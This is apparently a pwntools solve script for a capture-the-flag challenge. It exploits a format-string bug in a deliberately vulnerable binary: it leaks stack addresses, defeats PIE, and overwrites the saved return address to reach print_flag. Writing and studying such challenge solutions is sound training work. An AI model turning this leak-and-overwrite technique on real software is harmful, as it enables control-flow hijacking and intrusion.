# 05-Grander-Finale — Pwny-CTF (script de solve)
from pwn import *


def leak_hex_int(output):
    import re

    # Match hex values of reasonable length (>= 4 chars to avoid noise)
    matches = re.findall(rb"0x[0-9a-fA-F]{4,}\b", output)
    return [int(m, 16) for m in matches]


FILE = "./grander_finale"
elf = ELF(FILE, checksec=False)
context.binary = FILE

HOST = "chal.sigpwny.com"
PORT = 1386
OFFSET = 10

conn = remote(HOST, PORT)

# %23$p - 0x150 = saved rip address # Found on the container
# %25$p -> main address # Found on the container
payload = b"%25$p %23$p"

conn.sendlineafter(b"? ", payload)
out = conn.recvline()

# main address
MAIN_ADDR = leak_hex_int(out)[0]
info(f"{hex(MAIN_ADDR) = }")

## SYMBOLS
# base address
BASE_ADDR = MAIN_ADDR - elf.symbols["main"]
info(f"{hex(BASE_ADDR) = }")

# Setting 'elf.address' with the base address so it calculates the following addresses for us
elf.address = BASE_ADDR

# print_flag address
PRINT_FLAG_ADDR = elf.symbols["print_flag"]
info(f"{hex(PRINT_FLAG_ADDR) = }")

# leak for saved rip calculation
leak_for_rip = leak_hex_int(out)[1]
info(f"{hex(leak_for_rip) = }")

# saved rip calculation
saved_rip_addr = leak_for_rip - 0x150
info(f"{hex(saved_rip_addr) = }")


# payload construction
# write_size='short' (et pas 'byte') pour raccourcir le payload : name fait 64 octets.
# NB : on ecrit l'adresse complete (48 bits -> 3 shorts), ce qui donne un payload de
# 64 a 80 octets. Or fgets(name, 64, stdin) ne lit que 63 octets -> il arrive qu'il soit
# tronque et que l'exploit echoue (~60-70 % de reussite) : relancer si besoin.
# (Pour le rendre deterministe : n'ecrire que les 32 bits bas -> PRINT_FLAG_ADDR & 0xffffffff.)
payload = fmtstr_payload(OFFSET, {saved_rip_addr: PRINT_FLAG_ADDR}, write_size="short")
info(f"{len(payload) = }")

conn.sendlineafter(b"? ", payload)
conn.interactive()
